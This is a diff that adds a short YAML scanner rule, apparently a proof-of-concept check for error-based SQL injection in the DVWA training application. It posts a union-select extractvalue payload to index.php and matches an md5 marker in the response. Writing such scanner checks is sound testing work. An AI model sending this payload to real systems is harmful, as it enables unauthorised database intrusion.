@@ -1,0 +1,11 @@
+name: error-based-dvwa-post
+type: SQLI
+rules:
+  - method: POST
+    path: index.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Content-type: application/x-www-form-urlencoded
+    body: id=1' union select extractvalue(1,concat(0x7e,md5(99999999)))#&Submit=Submit
+    expression: result.contains("ef775988943825d2871e1cfa75473ec")
+author: ch4ser
